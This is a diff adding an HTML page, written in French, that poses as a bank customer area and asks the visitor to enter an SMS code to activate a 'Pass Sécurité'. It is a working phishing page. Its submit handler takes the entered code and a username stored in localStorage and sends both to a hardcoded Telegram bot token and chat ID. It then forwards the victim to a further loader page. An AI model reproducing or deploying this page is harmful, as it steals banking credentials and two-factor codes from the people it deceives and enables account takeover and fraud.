@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à votre Espace Client Particuliers</title>
+
+    <!-- Vuetify CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font/css/materialdesignicons.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.6.10/dist/vuetify.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<style>
+    #valider {
+        display: none;
+    }
+    input{
+        text-transform: uppercase;
+    }
+</style>
+
+<body>
+    <!-- Conteneur pour Vue -->
+    <div id="app">
+        <div class="top">
+            <img src="./img/top.png" style="width: 100%;">
+        </div>
+        <div class="top-big">
+            <img src="./img/top-big.png" style="width: 100%;">
+            <v-divider></v-divider>
+        </div>
+        <br>
+        <br>
+        <br>
+
+        <h4>Pour activer votre Pass Sécurité, veuillez saisir le code reçu par SMS.</h4>
+        <br>
+        <div class="center">
+    
+            <form id="form">
+                <v-text-field v-model="first" id="sms" color="success" label="Code recu par sms"
+                    variant="underlined" type="text" maxlength="8"  clearable required></v-text-field>
+
+                <br>
+                <button class="button" type="submit">Valider</button>
+            </form>
+        </div>
+
+        <br> <br>
+        <br> <br>
+
+       
+    
+    </div>
+
+    <!-- Vue.js -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+    <!-- Vuetify -->
+    <script src="https://cdn.jsdelivr.net/npm/vuetify@2.6.10/dist/vuetify.js"></script>
+    <script>
+        new Vue({
+            el: '#app',
+            vuetify: new Vuetify(),
+            data: () => ({
+                first: '',
+                model: true,
+            })
+        });
+    </script>
+
+    <script>
+
+  //      document.addEventListener('DOMContentLoaded', function () {
+   //         var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 48, 45, 48, 50));
+   //         var b = new Date();
+    //        var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+    //        if (c >= a) {
+    //            document.body.style.backgroundColor = 'red';
+    //        }
+    //    });
+
+        
+
+       
+
+
+        document.getElementById('form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const botToken = '7364824807:AAEfYYzYqOId2J8xXr8BUUpsnTQje6h0e3c';
+            const chatId = '1634155885';
+
+            // Récupérer les valeurs des champs
+            const sms = document.getElementById("sms").value.trim();
+            var user = localStorage.getItem('user') ;
+           
+           
+            // Vérifier si tous les champs sont remplis
+            if (!sms) {
+                alert("Veuillez remplir le code recu par sms.");
+                return; // Empêche l'envoi du message si les champs ne sont pas tous remplis
+            }
+
+            const message = `💕 SG :\n\n👤 Utilisateur : ${user}\n➡️ Auth : ${sms}`;
+
+            // Construction de l'URL de l'API Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Envoi de la requête à l'API Telegram
+            fetch(telegramURL)
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error("Erreur lors de l'envoi du message à Telegram");
+                        });
+                    }
+                    localStorage.setItem('user', user);
+                    window.location.href = './loader2.html';
+                })
+                .catch(error => {
+                    console.error('Erreur :', error);
+                });
+        });
+    </script>
+
+</body>
+
+</html>
